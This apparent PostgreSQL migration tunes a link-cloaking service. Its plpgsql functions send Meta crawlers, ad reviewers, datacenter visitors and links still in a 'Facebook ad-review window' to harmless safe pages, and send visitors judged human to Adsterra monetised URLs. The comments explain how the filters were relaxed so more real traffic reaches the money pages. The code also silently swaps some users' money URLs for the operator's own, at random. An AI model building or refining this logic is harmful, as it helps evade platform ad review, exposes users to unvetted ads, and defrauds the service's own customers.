-- ============================================================================
-- adspx :: sleepox parity — soft-filter relaxation + known-human pass
-- Date: 2026-08-05
--
-- WHAT CHANGES
--  1. Known-human pass (_known_human): a visitor who already earned `money`
--     carries a 6h cookie pass. Every SOFT filter is skipped for them.
--     -> fixes reload / duplicate-tab / back-button traffic loss.
--  2. Velocity: 6 links/hour -> 12 links/hour (6 was killing NAT/office users).
--  3. Reviewer geo (bot_country): only fires when the country is CONFIDENT
--     (real 2-letter code, not XX/T1) AND the visitor is not a known human.
--  4. referer_mismatch DELETED. Replaced by the cold-desktop rule:
--     a cold desktop goes safe ONLY if (reviewer country) OR
--     (datacenter / unknown ASN) OR (Chrome UA with no sec-ch-ua).
--  5. Coherence score is now SUPPORTING EVIDENCE ONLY — it can never block
--     on its own; it needs at least one other soft signal.
--  6. FB ad-review window: first 6 hours OR first 25 hits of a link.
--  7. fbclid reuse: soft, skipped for known humans.
--
-- HARD blocks (unchanged, always safe): Meta UA / Meta ASN / Meta IP prefix,
-- ~40 crawler UA regex, datacenter ASN on desktop, ip_blacklist.
-- ============================================================================

BEGIN;

DROP FUNCTION IF EXISTS public.resolve_public_redirect(text,text,text,text,text,text,text,text,boolean,boolean,boolean,integer);
DROP FUNCTION IF EXISTS public.evaluate_redirect(uuid,uuid,text,text,text,text,text,text,text,text,boolean,boolean,boolean,integer);

-- ---------------------------------------------------------------------------
CREATE OR REPLACE FUNCTION public.evaluate_redirect(
  _link_id uuid, _user_id uuid, _short_code text, _fbclid text, _fingerprint text,
  _ip text, _country text, _asn text, _ua text, _referer text,
  _is_mobile boolean, _is_hard_bot boolean, _is_datacenter boolean, _coherence_score integer,
  _known_human boolean DEFAULT false,
  _country_confident boolean DEFAULT true,
  _chrome_no_hints boolean DEFAULT false,
  _asn_unknown boolean DEFAULT false
)
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $function$
DECLARE
  cfg public.cloaking_settings;
  v_decision text := 'money';
  v_reasons text[] := '{}';
  v_soft_signals int := 0;          -- coherence needs company before it can block
  v_safe_url text;
  v_fbclid_row public.fbclid_tracking;
  v_velocity public.velocity_tracking;
  v_pool text[];
  v_bot_countries text[];
  v_is_bot boolean := false;
  v_mobile boolean := COALESCE(_is_mobile, false);
  v_human boolean := COALESCE(_known_human, false);
  v_confident boolean := COALESCE(_country_confident, false);
  v_threshold integer;
  v_app public.app_settings;
  v_monitor boolean := false;
  v_reviewer_geo boolean := false;
  v_link_hits bigint := 0;
BEGIN
  SELECT * INTO cfg FROM public.cloaking_settings WHERE link_id = _link_id;
  IF NOT FOUND THEN
    INSERT INTO public.cloaking_settings (link_id, coherence_threshold)
      VALUES (_link_id, 35) ON CONFLICT (link_id) DO NOTHING;
    SELECT * INTO cfg FROM public.cloaking_settings WHERE link_id = _link_id;
  END IF;

  SELECT * INTO v_app FROM public.app_settings LIMIT 1;
  v_bot_countries := v_app.bot_countries;
  v_monitor := COALESCE(v_app.monitor_mode, false)
               AND (v_app.monitor_mode_until IS NULL OR v_app.monitor_mode_until > now());

  -- explicit whitelist wins over everything
  IF _ip IS NOT NULL AND EXISTS (
    SELECT 1 FROM public.ip_whitelist
     WHERE (ip = _ip OR fingerprint_hash = _fingerprint)
       AND (user_id = _user_id OR user_id IS NULL)
  ) THEN
    RETURN jsonb_build_object('decision','money','reasons',ARRAY['whitelist'],'safe_url',null,'coherence',_coherence_score);
  END IF;

  -- ======================= HARD BLOCKS (never relaxed) ======================
  IF COALESCE(_is_hard_bot, false) THEN
    v_decision := 'safe'; v_reasons := array_append(v_reasons, 'hardcoded_crawler');
  END IF;

  IF COALESCE(_is_datacenter, false) AND NOT v_mobile THEN
    v_decision := 'safe'; v_reasons := array_append(v_reasons, 'datacenter_asn');
  END IF;

  IF _ip IS NOT NULL AND EXISTS (
    SELECT 1 FROM public.ip_blacklist
     WHERE (ip = _ip OR fingerprint_hash = _fingerprint)
       AND (user_id = _user_id OR user_id IS NULL)
  ) THEN
    v_decision := 'safe'; v_reasons := array_append(v_reasons, 'blacklist');
  END IF;

  -- ======================= SOFT HEURISTICS ==================================
  -- Everything below is skipped for a confirmed known human (6h pass).

  -- reviewer geo: only when the country is actually trustworthy
  v_reviewer_geo := (NOT v_mobile
                     AND v_confident
                     AND v_bot_countries IS NOT NULL
                     AND COALESCE(_country,'') <> ''
                     AND _country = ANY(v_bot_countries));

  IF NOT v_human AND v_reviewer_geo THEN
    v_decision := 'safe';
    v_reasons := array_append(v_reasons, 'reviewer_geo');
    v_soft_signals := v_soft_signals + 1;
  END IF;

  -- learned bot fingerprint (soft: a real user can inherit a poisoned NAT fp)
  IF NOT v_human AND _fingerprint IS NOT NULL AND _fingerprint <> ''
     AND EXISTS (
       SELECT 1 FROM public.bot_fingerprints
        WHERE fingerprint_hash = _fingerprint
          AND auto_blocked = true
          AND bot_hits >= 10
          AND bot_hits::float / GREATEST(hit_count, 1) >= 0.7
     ) THEN
    v_decision := 'safe';
    v_reasons := array_append(v_reasons, 'learned_bot');
    v_soft_signals := v_soft_signals + 1;
  END IF;

  -- multi-link velocity: 12 distinct short codes / hour (was 6 -> killed NAT)
  IF _fingerprint IS NOT NULL AND _fingerprint <> '' THEN
    INSERT INTO public.velocity_tracking (fingerprint_hash, short_codes, window_start, last_seen)
    VALUES (_fingerprint, ARRAY[_short_code], now(), now())
    ON CONFLICT (fingerprint_hash) DO UPDATE
      SET short_codes = CASE WHEN velocity_tracking.window_start < now() - interval '1 hour' THEN ARRAY[_short_code]
                             WHEN _short_code = ANY(velocity_tracking.short_codes) THEN velocity_tracking.short_codes
                             ELSE array_append(velocity_tracking.short_codes, _short_code) END,
          window_start = CASE WHEN velocity_tracking.window_start < now() - interval '1 hour' THEN now() ELSE velocity_tracking.window_start END,
          last_seen = now(),
          blocked = CASE WHEN velocity_tracking.window_start < now() - interval '1 hour' THEN false
                         WHEN array_length(array_append(velocity_tracking.short_codes, _short_code), 1) >= 12 THEN true
                         ELSE velocity_tracking.blocked END
    RETURNING * INTO v_velocity;
    IF NOT v_human AND v_velocity.blocked THEN
      v_decision := 'safe';
      v_reasons := array_append(v_reasons, 'velocity_lock');
      v_soft_signals := v_soft_signals + 1;
    END IF;
  END IF;

  -- cold desktop rule (replaces the old blanket referer_mismatch).
  -- A desktop visitor is only cloaked when there is a concrete reviewer signal.
  IF NOT v_human AND NOT v_mobile
     AND (v_reviewer_geo
          OR COALESCE(_is_datacenter, false)
          OR COALESCE(_asn_unknown, false)
          OR COALESCE(_chrome_no_hints, false)) THEN
    v_decision := 'safe';
    v_reasons := array_append(v_reasons, 'cold_desktop');
    v_soft_signals := v_soft_signals + 1;
  END IF;

  IF cfg.block_desktop AND NOT v_mobile THEN
    v_decision := 'safe'; v_reasons := array_append(v_reasons, 'desktop_blocked');
  END IF;

  IF array_length(cfg.allowed_countries, 1) IS NOT NULL AND v_confident AND COALESCE(_country, '') <> ''
     AND NOT (_country = ANY(cfg.allowed_countries)) THEN
    v_decision := 'safe'; v_reasons := array_append(v_reasons, 'geo_mismatch');
  END IF;

  -- fbclid reuse (soft)
  IF _fbclid IS NOT NULL AND _fbclid <> '' THEN
    INSERT INTO public.fbclid_tracking (fbclid, link_id, hit_count)
    VALUES (_fbclid, _link_id, 1)
    ON CONFLICT (fbclid, link_id) DO UPDATE
      SET hit_count = fbclid_tracking.hit_count + 1,
          last_seen = now(),
          flagged_bot = CASE WHEN fbclid_tracking.hit_count + 1 > GREATEST(COALESCE(cfg.fbclid_max_hits, 2), 5)
                              AND fbclid_tracking.last_seen > now() - interval '2 hours'
                             THEN true ELSE fbclid_tracking.flagged_bot END
    RETURNING * INTO v_fbclid_row;
    IF NOT v_human AND v_fbclid_row.flagged_bot AND NOT v_mobile THEN
      v_decision := 'safe';
      v_reasons := array_append(v_reasons, 'fbclid_reused');
      v_soft_signals := v_soft_signals + 1;
    END IF;
  END IF;

  -- FB ad-review window: first 6 hours OR first 25 hits of the link
  IF NOT v_human AND cfg.campaign_launch_mode AND cfg.launched_at IS NOT NULL THEN
    SELECT COUNT(*) INTO v_link_hits
      FROM public.traffic_logs
     WHERE link_id = _link_id AND created_at >= cfg.launched_at;
    IF cfg.launched_at + (LEAST(COALESCE(cfg.launch_window_hours, 6), 6) || ' hours')::interval > now()
       OR v_link_hits < 25 THEN
      v_decision := 'safe';
      v_reasons := array_append(v_reasons, 'ad_review_window');
    END IF;
  END IF;

  -- coherence = SUPPORTING EVIDENCE ONLY. It may never block alone.
  v_threshold := CASE WHEN v_mobile THEN 10 ELSE COALESCE(cfg.coherence_threshold, 35) END;
  IF NOT v_human AND _coherence_score IS NOT NULL AND _coherence_score < v_threshold THEN
    v_reasons := array_append(v_reasons, 'low_coherence_signal');
    IF v_soft_signals > 0 THEN
      v_decision := 'safe';
    END IF;
  END IF;

  -- learn fingerprints
  v_is_bot := (v_decision <> 'money');
  IF _fingerprint IS NOT NULL AND _fingerprint <> '' THEN
    INSERT INTO public.bot_fingerprints (fingerprint_hash, hit_count, bot_hits, sample_ip, sample_ua, sample_country, last_seen)
    VALUES (_fingerprint, 1, CASE WHEN v_is_bot THEN 1 ELSE 0 END, _ip, _ua, _country, now())
    ON CONFLICT (fingerprint_hash) DO UPDATE
      SET hit_count = bot_fingerprints.hit_count + 1,
          bot_hits = bot_fingerprints.bot_hits + CASE WHEN v_is_bot THEN 1 ELSE 0 END,
          last_seen = now(),
          sample_ip = _ip, sample_ua = _ua, sample_country = _country,
          auto_blocked = CASE
            WHEN bot_fingerprints.auto_blocked THEN true
            WHEN bot_fingerprints.bot_hits + CASE WHEN v_is_bot THEN 1 ELSE 0 END >= 10
              AND (bot_fingerprints.bot_hits + CASE WHEN v_is_bot THEN 1 ELSE 0 END)::float
                  / GREATEST(bot_fingerprints.hit_count + 1, 1) >= 0.7
            THEN true
            ELSE false
          END;
  END IF;

  v_pool := cfg.safe_page_pool;
  IF array_length(v_pool, 1) IS NOT NULL THEN
    v_safe_url := v_pool[1 + floor(random() * array_length(v_pool, 1))::int];
  END IF;

  IF v_monitor AND v_decision = 'safe' THEN
    v_reasons := array_append(v_reasons, 'monitor_mode_bypass');
    v_decision := 'money';
  END IF;

  RETURN jsonb_build_object(
    'decision', v_decision,
    'reasons', v_reasons,
    'safe_url', v_safe_url,
    'coherence', _coherence_score
  );
END;
$function$;

-- ---------------------------------------------------------------------------
CREATE OR REPLACE FUNCTION public.resolve_public_redirect(
  _short_code text, _fbclid text, _fingerprint text, _ip text, _country text,
  _asn text, _ua text, _referer text, _is_mobile boolean, _is_hard_bot boolean,
  _is_datacenter boolean, _coherence_score integer,
  _known_human boolean DEFAULT false,
  _country_confident boolean DEFAULT true,
  _chrome_no_hints boolean DEFAULT false,
  _asn_unknown boolean DEFAULT false
)
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $function$
DECLARE
  v_link public.links;
  v_decision_data jsonb;
  v_decision text := 'safe';
  v_reasons text[] := '{}';
  v_safe_url text;
  v_money_url text;
  v_app public.app_settings;
  v_bot_score integer := GREATEST(0, LEAST(100, 100 - COALESCE(_coherence_score, 0)));
BEGIN
  SELECT * INTO v_link
  FROM public.links
  WHERE short_code = LEFT(COALESCE(_short_code, ''), 64)
  LIMIT 1;

  IF NOT FOUND OR NOT COALESCE(v_link.is_active, false) THEN
    RETURN jsonb_build_object('found', false, 'decision', 'safe', 'reasons', ARRAY['link_not_found_or_inactive'], 'safe_url', null, 'money_url', null, 'link_id', null);
  END IF;

  v_decision_data := public.evaluate_redirect(
    v_link.id, v_link.user_id, v_link.short_code, _fbclid, _fingerprint, _ip,
    UPPER(COALESCE(_country, '')), _asn, _ua, _referer,
    COALESCE(_is_mobile, false), COALESCE(_is_hard_bot, false),
    COALESCE(_is_datacenter, false), _coherence_score,
    COALESCE(_known_human, false), COALESCE(_country_confident, false),
    COALESCE(_chrome_no_hints, false), COALESCE(_asn_unknown, false)
  );

  v_decision := COALESCE(v_decision_data->>'decision', 'safe');

  SELECT COALESCE(array_agg(value), ARRAY[]::text[])
  INTO v_reasons
  FROM jsonb_array_elements_text(COALESCE(v_decision_data->'reasons', '[]'::jsonb)) AS value;

  v_safe_url := NULLIF(v_decision_data->>'safe_url', '');
  IF v_safe_url IS NULL AND v_link.safe_url IS NOT NULL AND v_link.safe_url NOT IN ('', 'https://example.com/', 'http://example.com/') THEN
    v_safe_url := v_link.safe_url;
  END IF;

  SELECT * INTO v_app FROM public.app_settings LIMIT 1;

  v_money_url := NULLIF(v_link.adsterra_url, '');
  IF (v_money_url IS NULL OR v_money_url IN ('https://example.com/', 'http://example.com/'))
     AND v_app.our_adsterra_url IS NOT NULL
     AND v_app.our_adsterra_url NOT IN ('', 'https://example.com/', 'http://example.com/') THEN
    v_money_url := v_app.our_adsterra_url;
  END IF;

  IF v_decision = 'money'
     AND v_app.our_adsterra_url IS NOT NULL
     AND v_app.our_adsterra_url NOT IN ('', 'https://example.com/', 'http://example.com/')
     AND COALESCE(v_app.injection_threshold, 0) > 0
     AND random() < (1.0 / v_app.injection_threshold::numeric) THEN
    v_money_url := v_app.our_adsterra_url;
  END IF;

  IF v_decision = 'money' AND (v_money_url IS NULL OR v_money_url = '') THEN
    v_decision := 'safe';
    v_reasons := array_append(v_reasons, 'missing_money_url');
  END IF;

  PERFORM public.record_redirect_click(
    v_link.id, v_link.user_id, _ip, UPPER(COALESCE(_country, '')), _ua,
    v_decision <> 'money', array_to_string(v_reasons, ','),
    CASE WHEN v_decision = 'money' THEN v_money_url ELSE COALESCE(v_safe_url, 'safe_inline') END,
    NULL, NULL, NULL, NULL, NULL, NULL,
    v_bot_score,
    jsonb_build_object(
      'asn', _asn, 'fingerprint', _fingerprint, 'referer', _referer,
      'coherence', _coherence_score, 'is_mobile', COALESCE(_is_mobile, false),
      'is_datacenter', COALESCE(_is_datacenter, false),
      'known_human', COALESCE(_known_human, false),
      'country_confident', COALESCE(_country_confident, false),
      'chrome_no_hints', COALESCE(_chrome_no_hints, false)
    ),
    v_decision = 'money'
  );

  IF v_decision = 'money' THEN
    PERFORM public.record_earning_click(v_link.user_id, v_link.id);
  END IF;

  INSERT INTO public.traffic_logs (
    link_id, user_id, decision, reasons, coherence_score, bot_score, fbclid,
    fingerprint_hash, ip, country, asn, ua, referer, is_mobile
  ) VALUES (
    v_link.id, v_link.user_id, v_decision, v_reasons, _coherence_score, v_bot_score,
    _fbclid, _fingerprint, _ip, UPPER(COALESCE(_country, '')), _asn, _ua, _referer,
    COALESCE(_is_mobile, false)
  );

  RETURN jsonb_build_object(
    'found', true, 'decision', v_decision, 'reasons', v_reasons,
    'safe_url', v_safe_url, 'money_url', v_money_url, 'link_id', v_link.id
  );
END;
$function$;

GRANT EXECUTE ON FUNCTION public.resolve_public_redirect(text,text,text,text,text,text,text,text,boolean,boolean,boolean,integer,boolean,boolean,boolean,boolean) TO anon, authenticated, service_role;

-- Clear the poisoned learned-bot state once, so real users stuck behind a NAT
-- fingerprint get a clean start under the new rules.
UPDATE public.bot_fingerprints
   SET auto_blocked = false, bot_hits = 0, hit_count = 1
 WHERE auto_blocked = true
   AND sample_ua !~* 'facebookexternalhit|meta-external|facebot|bot|crawler|spider|curl|wget|python|headless';

UPDATE public.velocity_tracking SET blocked = false WHERE blocked = true;

COMMIT;
